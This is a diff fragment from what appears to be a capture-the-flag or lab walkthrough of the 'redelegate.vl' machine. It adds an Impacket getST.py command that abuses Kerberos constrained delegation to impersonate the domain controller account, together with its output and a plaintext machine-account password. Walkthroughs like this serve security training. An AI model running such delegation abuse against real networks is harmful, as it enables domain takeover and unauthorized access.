@@ -571,6 +571,14 @@ Now that the delegation has already been setup i can jump straight to using `get
 Also worth noting that there are two domain admins `Administrator` and `ryan.cooper`
 
 ```python
+getST.py -spn 'ldap/dc.redelegate.vl' -impersonate 'DC$' 'redelegate.vl/FS01$:Password123!'
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
 
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating DC$
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in DC$@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
 ```
 
